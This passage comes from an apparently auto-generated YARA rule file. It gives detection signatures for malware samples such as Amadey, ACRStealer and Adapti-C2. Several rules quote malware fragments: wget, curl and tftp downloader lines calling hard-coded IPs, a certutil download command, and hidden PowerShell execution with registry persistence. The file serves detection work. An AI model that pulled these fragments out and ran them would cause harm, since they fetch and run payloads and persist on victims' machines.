      $s14 = "e engine will terminate, returning iesBadActionData.Number that determines the sort order in which the actions are to be execute" ascii /* score: '14.00'*/
      $s15 = "connectsText;Formatted;Template;Condition;Guid;Path;Version;Language;Identifier;Binary;UpperCase;LowerCase;Filename;Paths;AnyPat" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule Amadey_signature__717b65a14160bf908dbae0e9889f6481_imphash_ {
   meta:
      description = "_subset_batch - file Amadey(signature)_717b65a14160bf908dbae0e9889f6481(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ca9930f9537efeb6b704634f528df22dd857a71fcc060308d73ee2ed1a5d8d3a"
   strings:
      $s1 = "B`Bkernel32.dll" fullword wide /* score: '20.00'*/
      $s2 = "vnc.exe" fullword ascii /* score: '19.00'*/
      $s3 = "net start termservice" fullword ascii /* score: '13.00'*/
      $s4 = "sc config termservice start= auto" fullword ascii /* score: '10.00'*/
      $s5 = "=%=7=D=|=" fullword ascii /* score: '9.00'*/ /* hex encoded string '}' */
      $s6 = "yLkv2R1R0O5RMVHggWww87cXaR6yIkvm7YElBLN9eyEYJHV9fPP DrIedBBmIAvm6Rsd2bBk0L0 " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule Amadey_signature__717b65a14160bf908dbae0e9889f6481_imphash__fb14b677 {
   meta:
      description = "_subset_batch - file Amadey(signature)_717b65a14160bf908dbae0e9889f6481(imphash)_fb14b677.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "fb14b67779559af123e61b6d205e27cd79952c5356d6077c0546575538baa5be"
   strings:
      $s1 = "vnc.exe" fullword ascii /* score: '19.00'*/
      $s2 = "net start termservice" fullword ascii /* score: '13.00'*/
      $s3 = "sc config termservice start= auto" fullword ascii /* score: '10.00'*/
      $s4 = ">%>7>D>|>" fullword ascii /* score: '9.00'*/ /* hex encoded string '}' */
      $s5 = "38FaRC7a7CpaY2Am w7igEt2" fullword ascii /* score: '9.00'*/
      $s6 = "7 7.747=7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'wtw' */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule ACRStealer_signature__d45f518ea71a78c8b78cf706c1a73ea5_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_d45f518ea71a78c8b78cf706c1a73ea5(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e94309e56a1fda5957f5a5bf0db001c43f173d155386fc9d7563cbafc6fd05dd"
   strings:
      $s1 = "VideoRecorder.dll" fullword ascii /* score: '23.00'*/
      $s2 = "rshcore.dll" fullword wide /* score: '23.00'*/
      $s3 = "Microsoft.VisualStudio.QualityTools.VideoRecorderEngine.dll" fullword wide /* score: '23.00'*/
      $s4 = "D:\\dbs\\el\\ddvsm\\out\\binaries\\x86ret\\bin\\i386\\Microsoft.VisualStudio.QualityTools.VideoRecorderEngine.pdb" fullword ascii /* score: '22.00'*/
      $s5 = "SetProcessDpiAwarenessContext" fullword ascii /* score: '15.00'*/
      $s6 = "IMFPresentationDescriptor::GetStreamDescriptorByIndex" fullword wide /* score: '15.00'*/
      $s7 = "MicrosoftVisualStudioQualityToolsVideoRecorder::ScreenStream::GetStreamDescriptor" fullword wide /* score: '15.00'*/
      $s8 = "MicrosoftVisualStudioQualityToolsVideoRecorder::AudioStream::GetStreamDescriptor" fullword wide /* score: '15.00'*/
      $s9 = "StreamDescriptor::GetMediaTypeHandler" fullword wide /* score: '15.00'*/
      $s10 = "IMFMediaSession.GetEvent()" fullword wide /* score: '15.00'*/
      $s11 = "IMFMediaSession.GetEventType()" fullword wide /* score: '15.00'*/
      $s12 = "CloseLogger" fullword ascii /* score: '14.00'*/
      $s13 = "Phttp://www.microsoft.com/pkiops/certs/Microsoft%20Time-Stamp%20PCA%202010(1).crt0" fullword ascii /* score: '13.00'*/
      $s14 = "Nhttp://www.microsoft.com/pkiops/crl/Microsoft%20Time-Stamp%20PCA%202010(1).crl0l" fullword ascii /* score: '13.00'*/
      $s15 = "DrawIconEx failed. x = %d, y= %d" fullword wide /* score: '12.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      8 of them
}

rule sig_9ac524cb42a8029453ae0cb4c18c42ae_imphash_ {
   meta:
      description = "_subset_batch - file 9ac524cb42a8029453ae0cb4c18c42ae(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ec77bf8f6f4902651ff030c23e181f387004817711e1e74cdf219bcafc7e40cc"
   strings:
      $s1 = "\\??\\C:\\Windows\\System32\\calc.exe" fullword wide /* score: '26.00'*/
      $s2 = "LoadKey failed." fullword ascii /* score: '10.00'*/
      $s3 = "Base64 decode failed." fullword ascii /* score: '9.00'*/
      $s4 = "3#3*31383@3" fullword ascii /* score: '9.00'*/ /* hex encoded string '3183' */
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      all of them
}

rule a65b780d29b8b14dc99a92bd47bd1104_imphash_ {
   meta:
      description = "_subset_batch - file a65b780d29b8b14dc99a92bd47bd1104(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "f35843d8b34d5c3bbf96571a62291484edc18a2829234370f580c3ecbc33cb66"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware  xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "            processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
      $s5 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s6 = "c9.pdb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      all of them
}

rule sig_8c6222c0261309893c80e9b7b23f9e63_imphash_ {
   meta:
      description = "_subset_batch - file 8c6222c0261309893c80e9b7b23f9e63(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9bea97575be32f50cac19f3b4d9533318c93d507647f226d4f408f8214905091"
   strings:
      $s1 = "* ,#NB" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule sig_96eed3be3bb6fcaae14d6df2a0fbaaf3_imphash_ {
   meta:
      description = "_subset_batch - file 96eed3be3bb6fcaae14d6df2a0fbaaf3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ab192b68258b2f053a1620aadc74246fbc1a50fcfe536992f1ebfc39281391b0"
   strings:
      $s1 = "KHATRA.EXE" fullword wide /* score: '22.00'*/
      $s2 = "0.0.0.3" fullword wide /* reversed goodware string '3.0.0.0' */ /* score: '16.00'*/
      $s3 = "?22222222222222( " fullword ascii /* score: '9.00'*/ /* hex encoded string '"""""""' */
      $s4 = "iupqgbx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule Adapti_C2_signature__c86a15ad8daa9fda8a1aa35746d80e0f_imphash_ {
   meta:
      description = "_subset_batch - file Adapti-C2(signature)_c86a15ad8daa9fda8a1aa35746d80e0f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3b41578c2583a93966207bb1cee44153d1d98af48b57f447f2f3596172e381c0"
   strings:
      $s1 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule Adapti_C2_signature__c86a15ad8daa9fda8a1aa35746d80e0f_imphash__8ca74bbe {
   meta:
      description = "_subset_batch - file Adapti-C2(signature)_c86a15ad8daa9fda8a1aa35746d80e0f(imphash)_8ca74bbe.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8ca74bbef63dfb18383c9b411e7bad71e8ffbad517a6d2b75037a064f498bc8b"
   strings:
      $s1 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule sig_8639a7644f9bd376a140b3a6fea2994273b3fbc5ea78dd01c15682e2721ff444_8639a764 {
   meta:
      description = "_subset_batch - file 8639a7644f9bd376a140b3a6fea2994273b3fbc5ea78dd01c15682e2721ff444_8639a764.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8639a7644f9bd376a140b3a6fea2994273b3fbc5ea78dd01c15682e2721ff444"
   strings:
      $s1 = "LOgxVo:" fullword ascii /* score: '9.00'*/
      $s2 = "KbDLl2a" fullword ascii /* score: '9.00'*/
      $s3 = "gdlL|=t" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      all of them
}

rule sig_8492a0a8ed16a7e2732a6aeaea4c20a55487fe5921e33b5b7eebb27a537b500d_8492a0a8 {
   meta:
      description = "_subset_batch - file 8492a0a8ed16a7e2732a6aeaea4c20a55487fe5921e33b5b7eebb27a537b500d_8492a0a8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8492a0a8ed16a7e2732a6aeaea4c20a55487fe5921e33b5b7eebb27a537b500d"
   strings:
      $s1 = "uespemos" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 700KB and
      all of them
}

rule sig_85770945e3c2c42e5a9b7a5d6dd9b4050d030c2b9eea14562dd49b0580a2744c_85770945 {
   meta:
      description = "_subset_batch - file 85770945e3c2c42e5a9b7a5d6dd9b4050d030c2b9eea14562dd49b0580a2744c_85770945.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "85770945e3c2c42e5a9b7a5d6dd9b4050d030c2b9eea14562dd49b0580a2744c"
   strings:
      $s1 = "    wget http://$server_ip/$binname.$arch -O $execname" fullword ascii /* score: '22.00'*/
      $s2 = "execname=\"test.exploit\"" fullword ascii /* score: '16.00'*/
      $s3 = "    rm -rf $execname" fullword ascii /* score: '11.00'*/
      $s4 = "server_ip=\"109.205.213.5\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule sig_91228897b8dc0f376151847fada203aa7f067d6387187442663d8d4206d2bf3d_91228897 {
   meta:
      description = "_subset_batch - file 91228897b8dc0f376151847fada203aa7f067d6387187442663d8d4206d2bf3d_91228897.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "91228897b8dc0f376151847fada203aa7f067d6387187442663d8d4206d2bf3d"
   strings:
      $s1 = "    wget http://$server_ip/$binname.$arch -O $execname" fullword ascii /* score: '22.00'*/
      $s2 = "execname=\"lte.exploit\"" fullword ascii /* score: '16.00'*/
      $s3 = "    rm -rf $execname" fullword ascii /* score: '11.00'*/
      $s4 = "server_ip=\"109.205.213.5\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule aa71aee96b1463d7de7e8e4b80f4fdc8ce8682df4f163978ce57e93e0ff738d8_aa71aee9 {
   meta:
      description = "_subset_batch - file aa71aee96b1463d7de7e8e4b80f4fdc8ce8682df4f163978ce57e93e0ff738d8_aa71aee9.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "aa71aee96b1463d7de7e8e4b80f4fdc8ce8682df4f163978ce57e93e0ff738d8"
   strings:
      $s1 = "    wget http://$server_ip/$binname.$arch -O $execname" fullword ascii /* score: '22.00'*/
      $s2 = "execname=\"ssh\"" fullword ascii /* score: '12.00'*/
      $s3 = "    rm -rf $execname" fullword ascii /* score: '11.00'*/
      $s4 = "server_ip=\"109.205.213.5\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule sig_8f8a313991afc6ddf497415e4803fc8a3ed12ac359fb9a4a27a350de9a9e932c_8f8a3139 {
   meta:
      description = "_subset_batch - file 8f8a313991afc6ddf497415e4803fc8a3ed12ac359fb9a4a27a350de9a9e932c_8f8a3139.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8f8a313991afc6ddf497415e4803fc8a3ed12ac359fb9a4a27a350de9a9e932c"
   strings:
      $s1 = "wget http://$server_ip/$binname.$arch -O $output || curl -o $output http://$server_ip/$binname.$arch || tftp -g -l $output -r $b" ascii /* score: '23.00'*/
      $s2 = "wget http://$server_ip/$binname.$arch -O $output || curl -o $output http://$server_ip/$binname.$arch || tftp -g -l $output -r $b" ascii /* score: '23.00'*/
      $s3 = "inname.$arch $server_ip || tftp $server_ip -c get $binname.$arch -l $output" fullword ascii /* score: '20.00'*/
      $s4 = "rm -rf $binname.$arch" fullword ascii /* score: '11.00'*/
      $s5 = "server_ip=\"95.214.53.214\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6962 and filesize < 1KB and
      all of them
}

rule a2789d77132a1f1809109cd36d103cefb9007454668160fc962bc278e931f7e2_a2789d77 {
   meta:
      description = "_subset_batch - file a2789d77132a1f1809109cd36d103cefb9007454668160fc962bc278e931f7e2_a2789d77.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a2789d77132a1f1809109cd36d103cefb9007454668160fc962bc278e931f7e2"
   strings:
      $s1 = "    $3kcbe36tsz8m = \"powershell -WindowStyle Hidden -Command \\`\"Start-Process -FilePath '$ndvfsqofnvu8mm2xcado' -WorkingDirec" ascii /* score: '24.00'*/
      $s2 = "    $3kcbe36tsz8m = \"powershell -WindowStyle Hidden -Command \\`\"Start-Process -FilePath '$ndvfsqofnvu8mm2xcado' -WorkingDirec" ascii /* score: '24.00'*/
      $s3 = "    $exec_cmd = \"Start-Process -FilePath '$ndvfsqofnvu8mm2xcado' -WorkingDirectory '$e6ftg5zfi' -WindowStyle Hidden\"" fullword ascii /* score: '22.00'*/
      $s4 = "$1lp7dz9l2maf39td4xxf = Get-ChildItem -Path $97f2f8nuyehd6n68s1r -Filter *.exe -Recurse | Select-Object -First 1" fullword ascii /* score: '20.00'*/
      $s5 = "$bios_dummy = Get-WmiObject Win32_BIOS | Select-Object -ExpandProperty SMBIOSBIOSVersion; if ($bios_dummy) { $bios_dummy = [Syst" ascii /* score: '19.00'*/
      $s6 = "$wreirgdc = @(\"$env:LOCALAPPDATA\", \"$env:APPDATA\", \"$env:USERPROFILE\\Documents\", \"$env:USERPROFILE\\Downloads\", \"$env:" ascii /* score: '19.00'*/
      $s7 = "    Set-ItemProperty -Path $1x5yib8txr -Name ('hz5tk5wuroe_system_s1a' + $8cms5uq0v2h212am7) -Value $3kcbe36tsz8m" fullword ascii /* score: '17.00'*/
      $s8 = "$bios_dummy = Get-WmiObject Win32_BIOS | Select-Object -ExpandProperty SMBIOSBIOSVersion; if ($bios_dummy) { $bios_dummy = [Syst" ascii /* score: '16.00'*/
      $s9 = "    zvagnvklh30ylxh9e7z0t4u 'download_fail' $kdqo1fcwx98fej4nv9z \"$env:TEMP\" ''" fullword ascii /* score: '15.00'*/
      $s10 = "    Invoke-Expression $exec_cmd" fullword ascii /* score: '14.00'*/
      $s11 = "    $926u5klk723apaag6yar = New-Object -ComObject WScript.Shell" fullword ascii /* score: '14.00'*/
      $s12 = "$e1ipg7mm0jmycvlw = \"$env:TEMP\\x7oact_updatekpti.zip\"" fullword ascii /* score: '14.00'*/
      $s13 = "$rxe9v0iakpnkv9b = \"test\" + (Get-Random)" fullword ascii /* score: '13.00'*/
      $s14 = "$yt3xssecfews8to0p = (Get-WmiObject Win32_OperatingSystem).Caption" fullword ascii /* score: '13.00'*/
      $s15 = "        zvagnvklh30ylxh9e7z0t4u 'download_ok' '' \"$env:TEMP\" ''" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x240a and filesize < 20KB and
      8 of them
}

rule sig_8630f6b45fcfcd7c4e421b6be38123d4469d1497f62ddf892063c659a57fc107_8630f6b4 {
   meta:
      description = "_subset_batch - file 8630f6b45fcfcd7c4e421b6be38123d4469d1497f62ddf892063c659a57fc107_8630f6b4.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8630f6b45fcfcd7c4e421b6be38123d4469d1497f62ddf892063c659a57fc107"
   strings:
      $s1 = "47,60,59,55,52,47,52,51,52,56,60,47,52,51,51,51,51,47,60,58,51,58,47,59,58,54,59,47,60,59,60,54,47,52,58,56,47,60,59,59,55,47,52" ascii /* score: '9.00'*/ /* hex encoded string 'G`YURGRQRV`GRQQQQG`XQXGYXTYG`Y`TGRXVG`YYUGR' */
      $s2 = "54,47,60,58,57,57,47,60,58,58,51,47,59,59,59,54,47,52,51,52,58,52,47,52,51,51,60,56,47,60,57,60,58,47,60,58,52,60,47,52,51,52,57" ascii /* score: '9.00'*/ /* hex encoded string 'TG`XWWG`XXQGYYYTGRQRXRGRQQ`VG`W`XG`XR`GRQRW' */
      $s3 = "53,53,47,52,51,56,47,52,53,60,47,52,51,52,47,55,53,47,57,58,47,52,59,47,52,54,54,47,57,58,47,52,59,47,52,54,54,47,52,59,47,52,53" ascii /* score: '9.00'*/ /* hex encoded string 'SSGRQVGRS`GRQRGUSGWXGRYGRTTGWXGRYGRTTGRYGRS' */
      $s4 = "59,58,53,60,47,52,58,58,47,60,56,55,47,52,51,52,57,53,47,60,57,57,60,47,59,57,51,53,47,52,51,51,55,60,47,53,56,56,47,59,59,59,53" ascii /* score: '9.00'*/ /* hex encoded string 'YXS`GRXXG`VUGRQRWSG`WW`GYWQSGRQQU`GSVVGYYYS' */
      $s5 = "57,57,47,59,59,57,57,47,52,51,51,56,54,47,60,60,51,53,47,60,57,56,60,47,60,58,51,60,47,59,59,59,55,47,59,59,52,54,47,52,51,52,56" ascii /* score: '9.00'*/ /* hex encoded string 'WWGYYWWGRQQVTG``QSG`WV`G`XQ`GYYYUGYYRTGRQRV' */
      $s6 = "47,53,55,56,47,52,52,53,52,52,47,60,57,52,47,59,60,47,56,56,54,57,57,47,56,57,58,51,54,47,55,57,54,56,47,59,51,58,52,47,52,52,58" ascii /* score: '9.00'*/ /* hex encoded string 'GSUVGRRSRRG`WRGY`GVVTWWGVWXQTGUWTVGYQXRGRRX' */
      $s7 = "52,51,51,55,54,47,60,57,60,58,47,52,59,47,56,56,47,56,56,47,55,51,47,52,51,51,54,55,47,52,51,52,57,58,47,60,58,57,54,47,60,59,54" ascii /* score: '9.00'*/ /* hex encoded string 'RQQUTG`W`XGRYGVVGVVGUQGRQQTUGRQRWXG`XWTG`YT' */
      $s8 = "54,47,52,51,52,58,57,47,60,60,51,58,47,60,58,57,55,47,59,58,57,55,47,52,51,52,56,59,47,59,59,58,56,47,52,51,52,57,58,47,60,57,59" ascii /* score: '9.00'*/ /* hex encoded string 'TGRQRXWG``QXG`XWUGYXWUGRQRVYGYYXVGRQRWXG`WY' */
      $s9 = "52,51,52,57,52,47,59,58,56,56,47,52,51,52,56,53,47,59,59,58,51,47,60,58,54,58,47,60,57,54,47,60,58,56,51,47,52,51,51,52,53,47,59" ascii /* score: '9.00'*/ /* hex encoded string 'RQRWRGYXVVGRQRVSGYYXQG`XTXG`WTG`XVQGRQQRSGY' */
      $s10 = "55,47,52,53,56,51,51,47,60,59,54,56,47,52,51,51,52,52,47,52,51,52,57,58,47,59,58,56,56,47,52,51,52,58,56,47,52,51,52,56,59,47,59" ascii /* score: '9.00'*/ /* hex encoded string 'UGRSVQQG`YTVGRQQRRGRQRWXGYXVVGRQRXVGRQRVYGY' */
      $s11 = "51,55,51,47,60,57,60,57,47,60,60,51,54,47,59,57,51,58,47,52,59,56,47,60,58,57,53,47,60,58,60,56,47,59,58,56,56,47,59,58,55,53,47" ascii /* score: '9.00'*/ /* hex encoded string 'QUQG`W`WG``QTGYWQXGRYVG`XWSG`X`VGYXVVGYXUSG' */
      $s12 = "53,55,47,52,53,56,47,52,53,53,47,52,52,59,47,55,51,47,52,51,57,47,52,52,54,47,52,52,59,47,52,51,59,47,52,51,60,47,52,53,53,47,56" ascii /* score: '9.00'*/ /* hex encoded string 'SUGRSVGRSSGRRYGUQGRQWGRRTGRRYGRQYGRQ`GRSSGV' */
      $s13 = "47,60,59,59,55,47,60,60,51,59,47,60,58,56,51,47,52,51,52,55,60,47,59,57,51,51,47,60,58,56,51,47,52,51,51,60,55,47,60,59,54,53,47" ascii /* score: '9.00'*/ /* hex encoded string 'G`YYUG``QYG`XVQGRQRU`GYWQQG`XVQGRQQ`UG`YTSG' */
      $s14 = "58,55,47,52,58,56,47,59,58,53,57,47,52,51,51,57,52,47,60,57,60,54,47,60,58,57,55,47,52,51,51,55,59,47,59,58,56,59,47,52,53,55,60" ascii /* score: '9.00'*/ /* hex encoded string 'XUGRXVGYXSWGRQQWRG`W`TG`XWUGRQQUYGYXVYGRSU`' */
      $s15 = "52,51,52,58,58,47,60,57,59,53,47,60,54,60,47,59,59,52,54,47,60,57,60,57,47,52,51,52,55,59,47,60,57,59,53,47,60,55,55,47,52,51,51" ascii /* score: '9.00'*/ /* hex encoded string 'RQRXXG`WYSG`T`GYYRTG`W`WGRQRUYG`WYSG`UUGRQQ' */
   condition:
      uint16(0) == 0x2f2f and filesize < 7000KB and
      8 of them
}

rule sig_8739121a4dc0b95b2b963d8bbe2e6d13d61d6ffb348528970d2589b46f2f8476_8739121a {
   meta:
      description = "_subset_batch - file 8739121a4dc0b95b2b963d8bbe2e6d13d61d6ffb348528970d2589b46f2f8476_8739121a.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8739121a4dc0b95b2b963d8bbe2e6d13d61d6ffb348528970d2589b46f2f8476"
   strings:
      $s1 = "Installer-332882N.exe" fullword ascii /* score: '19.00'*/
      $s2 = "info.dat" fullword ascii /* score: '14.00'*/
      $s3 = "info.datPK" fullword ascii /* score: '11.00'*/
      $s4 = "VbaS.cpx" fullword ascii /* score: '10.00'*/
      $s5 = "Installer-332882N.exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 20000KB and
      all of them
}

rule sig_8931fc2ae9a8a215471d841242717809fbb0132dba4b13b0dabcca13fafb4156_8931fc2a {
   meta:
      description = "_subset_batch - file 8931fc2ae9a8a215471d841242717809fbb0132dba4b13b0dabcca13fafb4156_8931fc2a.cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8931fc2ae9a8a215471d841242717809fbb0132dba4b13b0dabcca13fafb4156"
   strings:
      $x1 = "certutil -urlcache -split -f https://baa4ts.is-a-good.dev/Win2Internals.exe C:\\Users\\baa4ts\\Desktop\\Win2Internals.exe" fullword ascii /* score: '39.00'*/
   condition:
      uint16(0) == 0x6563 and filesize < 1KB and
      1 of ($x*)
}

rule ACRStealer_signature__ebbdd0c2 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_ebbdd0c2.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ebbdd0c28feabac64be6253e6ec83c791626e23797fe86e47ce0cce90f88e820"
   strings:
      $x1 = "#0pen_FlLe/x86/api-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "#0pen_FlLe/x86/api-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $s3 = "#0pen_FlLe/Temperature.dll" fullword ascii /* score: '27.00'*/
      $s4 = "#0pen_FlLe/x86/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s5 = "#0pen_FlLe/x86/api-ms-win-crt-private-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s6 = "#0pen_FlLe/Microsoft.DiaSymReader.Native.x86.dll" fullword ascii /* score: '23.00'*/
      $s7 = "#0pen_FlLe/x86/api-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s8 = "#0pen_FlLe/x86/api-ms-win-crt-conio-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s9 = "#0pen_FlLe/x86/api-ms-win-crt-heap-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s10 = "#0pen_FlLe/x86/api-ms-win-core-timezone-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s11 = "#0pen_FlLe/x86/api-ms-win-core-synch-l1-2-0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "#0pen_FlLe/x86/api-ms-win-core-profile-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "#0pen_FlLe/x86/api-ms-win-crt-environment-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "#0pen_FlLe/x86/api-ms-win-core-synch-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "#0pen_FlLe/x86/api-ms-win-core-util-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule a3__Logger_signature__bde1fb06 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_bde1fb06.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "bde1fb06968e7672beb680520d73db25de13421d5b3e8ad20044677f8ec27157"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "* \"`!\"" fullword ascii /* score: '9.00'*/
      $s3 = "HqUCMd2" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule a4e83e555835ac72787a90ca86190a6b56149dab10810a2dcacbeef94c58ddbb_a4e83e55 {
   meta:
      description = "_subset_batch - file a4e83e555835ac72787a90ca86190a6b56149dab10810a2dcacbeef94c58ddbb_a4e83e55.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a4e83e555835ac72787a90ca86190a6b56149dab10810a2dcacbeef94c58ddbb"
   strings:
      $s1 = "Yi!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" ascii /* score: '10.00'*/
      $s2 = "Yi!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" ascii /* score: '10.00'*/
      $s3 = "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" ascii /* score: '10.00'*/
      $s4 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s5 = "5+%f%>" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
      $s6 = "* R<L*C+" fullword ascii /* score: '9.00'*/
      $s7 = "KZHEyEE=" fullword ascii /* score: '9.00'*/
      $s8 = "a~9%d%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule sig_8cfa46c0e8f3fc4b242902ef4375c0127a033fc8c332a0b91c8301f8ead8c9f8_8cfa46c0 {
   meta:
      description = "_subset_batch - file 8cfa46c0e8f3fc4b242902ef4375c0127a033fc8c332a0b91c8301f8ead8c9f8_8cfa46c0.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8cfa46c0e8f3fc4b242902ef4375c0127a033fc8c332a0b91c8301f8ead8c9f8"
   strings:
      $s1 = "zlqgtnti" fullword ascii /* score: '8.00'*/
      $s2 = "fzfffffffffffffff" fullword ascii /* score: '8.00'*/
      $s3 = "ewBO* L" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule sig_897d54abe428218ce494afabf3ea9ca7f8fd17c5f5aa9eea665f4be4c4b001b4_897d54ab {
   meta:
      description = "_subset_batch - file 897d54abe428218ce494afabf3ea9ca7f8fd17c5f5aa9eea665f4be4c4b001b4_897d54ab.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "897d54abe428218ce494afabf3ea9ca7f8fd17c5f5aa9eea665f4be4c4b001b4"
   strings:
      $s1 = "MEYECB" fullword ascii /* score: '8.50'*/
      $s2 = "HHHY!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e46c9489a12a2b616ffe154da4fa43457a61c70442332b8642fde73a69f22fdd"
   strings:
      $s1 = "Ckpjgeze.exe" fullword wide /* score: '22.00'*/
